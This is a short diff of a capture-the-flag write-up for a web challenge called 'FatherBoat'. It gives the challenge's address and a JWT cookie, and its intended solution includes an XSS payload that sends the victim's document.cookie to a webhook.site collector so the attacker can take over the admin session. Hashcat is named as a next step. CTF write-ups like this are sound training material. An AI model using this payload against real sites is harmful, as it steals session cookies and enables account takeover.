@@ -1,10 +1,10 @@
-#FatherBoat (Web)
-Difficulty: Hard
-Solves: 0 :<
+#FatherBoat (Web) \n
+Difficulty: Hard \n
+Solves: 0 :< \n
 Link: http://139.59.124.129:51000/
 
 Intended Solution:
-1. XSS 
+1. XSS
   Payload: `<script>fetch("https://webhook.site/unique-id/?c="+document.cookie)</script>`
   Explanation: The website tells us that one requires approval from the admin to post a story. Instead of getting approval from the admin, one can instead be the admin and thus bypass the approval process, especially since the admin seems to be sleeping/braindead. XSS is possible here as the story of the user is injected directly into the HTML DOM. The cookie is `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhZG1pbiI6ImZhbHNlIn0.OqbksdUdBezk8bCqbh7wJOBuHFIKGoKGkdbAiu9SiJk`
 2. Hashcat
